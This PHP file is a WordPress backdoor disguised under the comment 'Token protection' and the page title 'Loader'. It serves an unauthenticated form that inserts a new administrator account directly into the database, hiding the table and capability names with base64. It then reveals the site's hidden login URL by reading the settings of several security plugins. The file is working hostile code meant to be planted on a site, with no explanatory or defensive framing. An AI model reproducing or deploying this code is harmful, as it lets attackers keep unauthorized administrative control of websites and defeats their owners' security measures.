<?php
// Token protection

// Load WP
require_once('wp-load.php');
global $wpdb;

// Obfuscated strings
$t_users = $wpdb->prefix . base64_decode('dXNlcnM='); // 'users'
$t_meta  = $wpdb->prefix . base64_decode('dXNlcm1ldGE='); // 'usermeta'
$m_caps  = $wpdb->prefix . base64_decode('Y2FwYWJpbGl0aWVz'); // 'capabilities'
$m_lvl   = $wpdb->prefix . base64_decode('dXNlcl9sZXZlbA=='); // 'user_level'

function get_login_url_obfuscated() {
    $site = site_url();
    $src = 'Default (wp-login.php)';
    $url = wp_login_url();

    $found = false;

    if ($wps = get_option('wps_hide_login')) {
        $url = trailingslashit($site) . ltrim($wps, '/');
        $src = 'WPS Hide Login';
        $found = true;
    }
    if ($its = get_option('itsec-hide-backend')) {
        if (!empty($its['enabled']) && !empty($its['slug'])) {
            $url = trailingslashit($site) . ltrim($its['slug'], '/');
            $src = 'iThemes Security';
            $found = true;
        }
    }
    if ($cerber = get_option('cerber_settings')) {
        if (!empty($cerber['login_url'])) {
            $url = trailingslashit($site) . ltrim($cerber['login_url'], '/');
            $src = 'WP Cerber';
            $found = true;
        }
    }
    if ($aio = get_option('aio_wp_security_configs')) {
        if (!empty($aio['aiowps_login_page_slug'])) {
            $url = trailingslashit($site) . ltrim($aio['aiowps_login_page_slug'], '/');
            $src = 'All In One WP Security';
            $found = true;
        }
    }

    if (!$found) {
        $url = wp_login_url(); // fallback
    }

    return "<p>🔑 <strong>Login URL ({$src}):</strong> <a href='" . esc_url($url) . "'>" . esc_html($url) . "</a></p>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = sanitize_user($_POST['u'] ?? '');
    $p = $_POST['p'] ?? '';
    $e = sanitize_email($_POST['e'] ?? '');

    if ($u && $p && $e) {
        if (username_exists($u) || email_exists($e)) {
            echo "<p style='color:red;'>❌ Already exists.</p>";
        } else {
            $h = wp_hash_password($p);
            $ok = $wpdb->insert($t_users, [
                'user_login'    => $u,
                'user_pass'     => $h,
                'user_nicename' => $u,
                'user_email'    => $e,
                'user_registered' => current_time('mysql'),
                'user_status'   => 0,
                'display_name'  => $u,
            ]);

            if ($ok) {
                $id = $wpdb->insert_id;
                $wpdb->insert($t_meta, ['user_id' => $id, 'meta_key' => $m_caps, 'meta_value' => serialize(['administrator' => 1])]);
                $wpdb->insert($t_meta, ['user_id' => $id, 'meta_key' => $m_lvl,  'meta_value' => 10]);

                echo "<p style='color:green;'>✅ User <b>{$u}</b> created.</p>";
                echo get_login_url_obfuscated();
            } else {
                echo "<p style='color:red;'>❌ DB Error: " . esc_html($wpdb->last_error) . "</p>";
            }
        }
    } else {
        echo "<p style='color:red;'>❌ Missing fields.</p>";
    }
} else {
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Loader</title></head>
<body>
<h2>Create WP Admin</h2>
<form method="post">
<label>Login:</label><br><input type="text" name="u" required><br>
<label>Pass:</label><br><input type="password" name="p" required><br>
<label>Email:</label><br><input type="email" name="e" required><br><br>
<button type="submit">Create</button>
</form>

<?php
// Always show login URL
echo get_login_url_obfuscated();
?>

</body></html>
<?php } ?>